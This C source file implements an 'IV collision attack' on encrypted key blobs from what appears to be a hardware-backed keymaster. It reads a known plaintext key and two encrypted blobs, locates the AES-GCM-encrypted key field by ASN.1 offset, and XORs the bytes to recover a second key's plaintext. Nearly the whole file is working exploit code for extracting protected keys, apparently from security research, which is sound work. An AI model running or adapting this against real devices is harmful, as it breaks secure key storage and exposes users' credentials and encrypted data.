#include <string.h>
#include <math.h>

#include <skeymaster_log.h>
#include <file_utils.h>
#include <skeymaster_defs.h>
#include <skeymaster_utils.h>

static size_t num_bytes(x)
{
    size_t n;
    if (0 == x) {
        n = 1;
    }
    else {
        n = log(x) / log(256) + 1;
    }
    return n;
}

KM_Result iv_collision_attack(
    const char *plain1_path,
    const char *ekey1_path,
    const char *ekey2_path,
    const char *output)
{
    KM_Result ret = KM_RESULT_INVALID;
    vector_t plain1 = {0};
    vector_t ekey1 = {0};
    vector_t ekey2 = {0};
    uint8_t *plaintext = NULL;

    if (NULL == plain1_path) {
        LOGE("invalid plain1_path %s (specify -p <path_to_plain1>)", "null");
        goto cleanup;
    }

    if (NULL == ekey1_path) {
        LOGE("invalid ekey1_path %s (specify -e <path_to_ekey1>)", "null");
        goto cleanup;
    }

    if (NULL == ekey2_path) {
        LOGE("invalid ekey2_path %s (specify -s <path_to_ekey2>)", "null");
        goto cleanup;
    }

    if (NULL == output) {
        LOGD("Invalid output %s (specify -o <path_to_output>)", "null");
        goto cleanup;
    }

    if (KM_RESULT_SUCCESS != READ_FILE(plain1_path, &plain1.data, &plain1.len)) {
        goto cleanup;
    }

    if (KM_RESULT_SUCCESS != READ_FILE(ekey1_path, &ekey1.data, &ekey1.len)) {
        goto cleanup;
    }

    if (KM_RESULT_SUCCESS != READ_FILE(ekey2_path, &ekey2.data, &ekey2.len)) {
        goto cleanup;
    }

    print_vec("plain1", plain1.data, plain1.len);
    print_vec("ekey1", ekey1.data, ekey1.len);
    print_vec("ekey2", ekey2.data, ekey2.len);

    size_t ekey_len_num_bytes = num_bytes(plain1.len) + num_bytes(ekey1.len - 1 - num_bytes(ekey1.len));
    size_t offset = 6 + ekey_len_num_bytes;

    // larger keys (e.g. RSA) use more bytes in ASN1 length field
    if (plain1.len > 0x100) {
        offset += 1;
    }

    LOGD("offset %ld", offset);

    /*
        km_key_blob_t is defined the following fields:
            - ver (ASN1_INTEGER)
            - key (ASN1_OCTET_STRING)
            - par (km_param_t)

        We get the encrypted ASN1 serialization of a km_key_blob_t (ekey1/ekey2) and skip
        to the key field to get the AES-GCM-256 encryption of the key material
    */
    uint8_t *encrypted_key_1 = ekey1.data + offset;
    uint8_t *encrypted_key_2 = ekey2.data + offset;

    // the length of the known key must be >= the length of the unknown key (since we xor the bytes)
    // so we use only the bytes we know for the xor
    size_t plain2_len = plain1.len;

    plaintext = malloc(plain2_len);
    if (NULL == plaintext) {
        LOGE("%s failed", "malloc");
        goto cleanup;
    }

    /*
        AES-GCM-256 encrypts the IV with the key and xors it with the data.
        Therefore, if we have a collision where both keys were encrypted
        using the same key HDK and same initial vector IV:

            - encrypted_key_1 = E(HDK, IV) xor plain1
            - encrypted_key_2 = E(HDK, IV) xor plain2

        Thus, xoring the encrypted key material of both keys with
        the known plaintext of one of them yield the plaintext key material of the other:

        plain1 xor encrypted_key_1 xor encrypted_key_2 = recovered_plain_2
    */
    for (int i = 0; i < plain2_len; ++i) {
        plaintext[i] = plain1.data[i] ^ encrypted_key_1[i] ^ encrypted_key_2[i];
    }

    print_vec("recovered plain2", plaintext, plain2_len);

    if (KM_RESULT_SUCCESS != WRITE_FILE(output, plaintext, plain2_len)) {
        goto cleanup;
    }

    ret = KM_RESULT_SUCCESS;

cleanup:
    if (NULL != plain1.data) {
        free(plain1.data);
    }
    if (NULL != ekey1.data) {
        free(ekey1.data);
    }
    if (NULL != ekey2.data) {
        free(ekey2.data);
    }
    if (NULL != plaintext) {
        free(plaintext);
    }
    return ret;
}
